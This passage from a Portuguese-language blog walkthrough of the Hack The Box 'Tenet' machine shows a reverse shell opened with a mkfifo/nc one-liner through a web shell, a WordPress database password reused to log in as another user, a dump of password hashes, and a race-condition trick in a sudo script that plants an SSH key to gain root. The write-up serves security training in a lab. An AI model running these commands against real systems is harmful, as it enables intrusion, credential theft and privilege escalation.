<p>Confirmado o acesso, realizado chamada para um shell reverso utilizando o comando abaixo:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-G</span> <span class="nt">--data-urlencode</span> <span class="s2">"cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 4443 &gt;/tmp/f"</span> http://10.10.10.223/shell.php
</code></pre></div></div>

<h2 id="user-flag">User Flag</h2>

<p>Uma vez com acesso à máquina, já que era sabido que tínhamos um wordpress instalado, busquei pelo arquivo de configuração do wordpress onde pude obter as credenciais para acesso ao banco do usuário <strong>neil</strong></p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// ** MySQL settings - You can get this info from your web host ** //</span>
<span class="cd">/** The name of the database for WordPress */</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_NAME'</span><span class="p">,</span> <span class="s1">'wordpress'</span> <span class="p">);</span>

<span class="cd">/** MySQL database username */</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_USER'</span><span class="p">,</span> <span class="s1">'neil'</span> <span class="p">);</span>

<span class="cd">/** MySQL database password */</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_PASSWORD'</span><span class="p">,</span> <span class="s1">'Opera2112'</span> <span class="p">);</span>

<span class="cd">/** MySQL hostname */</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_HOST'</span><span class="p">,</span> <span class="s1">'localhost'</span> <span class="p">);</span>
</code></pre></div></div>

<p>Como o reuso de credenciais é algo bastante comum, ao executar o comando <code class="language-plaintext highlighter-rouge">su neil</code>, fornecendo a senha presente no arquivo de configuração do wordpress, obtive o acesso com a conta do usuário e a flag de user.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>neil@tenet:~<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>neil<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>neil<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>neil<span class="o">)</span>
neil@tenet:~<span class="nv">$ </span><span class="nb">cat</span> ~/user.txt
&lt;redacted&gt;
neil@tenet:~<span class="err">$</span>
</code></pre></div></div>

<h2 id="root-flag">Root Flag</h2>

<p>No caminho para a flag de root, decidi fazer o dump das credenciais presentes no wordpress, onde os seguintes hashes foram encontrados.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; select user_login,user_pass from wp_users;
+-------------+------------------------------------+
| user_login  | user_pass                          |
+-------------+------------------------------------+
| protagonist | $P$BqNNfN07OWdaEfHmGwufBs.b.BebvZ. |
| neil        | $P$BtFC5SOvjEMFWLE4zq5DWXy7sJPUqM. |
+-------------+------------------------------------+
2 rows in set (0.00 sec)
</code></pre></div></div>

<p>Adicionalmente, buscando por possiveis privilégios de sudo do usuário neil (<code class="language-plaintext highlighter-rouge">sudo -l</code>), notado que o usuário possuía privilégios para executar o script <code class="language-plaintext highlighter-rouge">enableSSH.sh</code>, listado abaixo.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Matching Defaults entries for www-data on tenet:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:
    
User www-data may run the following commands on tenet:
    (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.sh
</code></pre></div></div>

<p>Analisando o conteúdo do script vemos que o mesmo foi criado para forçar a configuração de uma chave pública como autorizada para o usuário <code class="language-plaintext highlighter-rouge">root</code> para acesso SSH, embora não tenhamos acesso à mesma.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>

checkAdded<span class="o">()</span> <span class="o">{</span>
    <span class="nv">sshName</span><span class="o">=</span><span class="si">$(</span>/bin/echo <span class="nv">$key</span> | /usr/bin/cut <span class="nt">-d</span> <span class="s2">" "</span> <span class="nt">-f</span> 3<span class="si">)</span>
    <span class="k">if</span> <span class="o">[[</span> <span class="o">!</span> <span class="nt">-z</span> <span class="si">$(</span>/bin/grep <span class="nv">$sshName</span> /root/.ssh/authorized_keys<span class="si">)</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
        /bin/echo <span class="s2">"Successfully added </span><span class="nv">$sshName</span><span class="s2"> to authorized_keys file!"</span>
    <span class="k">else</span>
        /bin/echo <span class="s2">"Error in adding </span><span class="nv">$sshName</span><span class="s2"> to authorized_keys file!"</span>
    <span class="k">fi</span>
<span class="o">}</span>

checkFile<span class="o">()</span> <span class="o">{</span>
    <span class="k">if</span> <span class="o">[[</span> <span class="o">!</span> <span class="nt">-s</span> <span class="nv">$1</span> <span class="o">]]</span> <span class="o">||</span> <span class="o">[[</span> <span class="o">!</span> <span class="nt">-f</span> <span class="nv">$1</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
        /bin/echo <span class="s2">"Error in creating key file!"</span>
        <span class="k">if</span> <span class="o">[[</span> <span class="nt">-f</span> <span class="nv">$1</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span> /bin/rm <span class="nv">$1</span><span class="p">;</span> <span class="k">fi
        </span><span class="nb">exit </span>1
    <span class="k">fi</span>
<span class="o">}</span>

addKey<span class="o">()</span> <span class="o">{</span>
    <span class="nv">tmpName</span><span class="o">=</span><span class="si">$(</span><span class="nb">mktemp</span> <span class="nt">-u</span> /tmp/ssh-XXXXXXXX<span class="si">)</span>
    <span class="o">(</span><span class="nb">umask </span>110<span class="p">;</span> <span class="nb">touch</span> <span class="nv">$tmpName</span><span class="o">)</span>
    /bin/echo <span class="nv">$key</span> <span class="o">&gt;&gt;</span><span class="nv">$tmpName</span>
    checkFile <span class="nv">$tmpName</span>
    /bin/cat <span class="nv">$tmpName</span> <span class="o">&gt;&gt;</span>/root/.ssh/authorized_keys
    /bin/rm <span class="nv">$tmpName</span>
<span class="o">}</span>

<span class="nv">key</span><span class="o">=</span><span class="s2">"ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu"</span>
addKey
checkAdded
</code></pre></div></div>

<p>Analisando o script acima, notei uma possibilidade de hijack por conta de um race condition existente, onde na função “addKey” é criado um arquivo temporario, incluindo o seu conteúdo da chave pública e, após isso, seu conteúdo é adicionado no <code class="language-plaintext highlighter-rouge">/root/.ssh/authorized_keys</code>, possivelmente nos permitindo modificar este arquivo em tempo de execução para incluir outra chave SSH no lugar desta.</p>

<p>O desafio nesta parte é prever o nome do arquivo ssh em <code class="language-plaintext highlighter-rouge">/tmp</code>, mas que ao buscar por uma forma de adicionar um valor em múltiplos arquivos, o comando <code class="language-plaintext highlighter-rouge">tee</code> foi a melhor opção. O script abaixo foi criado e colocado em execução para infinitamente incluir o conteúdo de uma chave criada por mim em quaisquer arquivos que possuíssem o nome <code class="language-plaintext highlighter-rouge">ssh-*</code> em <code class="language-plaintext highlighter-rouge">/tmp</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
<span class="k">while </span><span class="nb">true</span><span class="p">;</span> <span class="k">do
        </span><span class="nb">echo</span> <span class="s2">"ssh-rsa AAAA..............BBBB= root@ubuntu"</span> | <span class="nb">tee</span> /tmp/ssh-<span class="k">*</span> 2&gt; /dev/null<span class="p">;</span>
<span class="k">done</span>
</code></pre></div></div>

<p>Com o script acima em execução, executado o comando para habilitar o SSH para o usuário <code class="language-plaintext highlighter-rouge">root</code> e logo na sequência, o comando ssh para se conectar com a chave privada em nossa posse, onde obtivemos sucesso para conectar nesta máquina utilizando o SSH e obter a flag de root :smiley:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>neil@tenet:/tmp<span class="nv">$ </span><span class="nb">sudo</span>  /usr/local/bin/enableSSH.sh
Successfully added root@ubuntu to authorized_keys file!
neil@tenet:/tmp<span class="nv">$ </span>ssh <span class="nt">-i</span> tenet root@tenet.htb
Welcome to Ubuntu 18.04.5 LTS <span class="o">(</span>GNU/Linux 4.15.0-129-generic x86_64<span class="o">)</span>
<span class="o">[</span>...]
root@tenet:~# <span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
root@tenet:~# <span class="nb">cat</span> /root/root.txt
b05e57e997cda49b47757cd3f0f9ac43
</code></pre></div></div>

<p>Espero que tenham gostado!</p>

<p>Vejo vocês no próximo post! :smile:</p>]]></content><author><name>Davi Cruz</name></author><category term="Walkthrough" /><category term="HackTheBox" /><category term="HTB Medium" /><category term="HTB Linux" /><summary type="html"><![CDATA[Olá pessoal! A máquina desta semana será Tenet, outra máquina Linux classificada como mediana do Hack The Box, criada por egotisticalSW.]]></summary></entry></feed>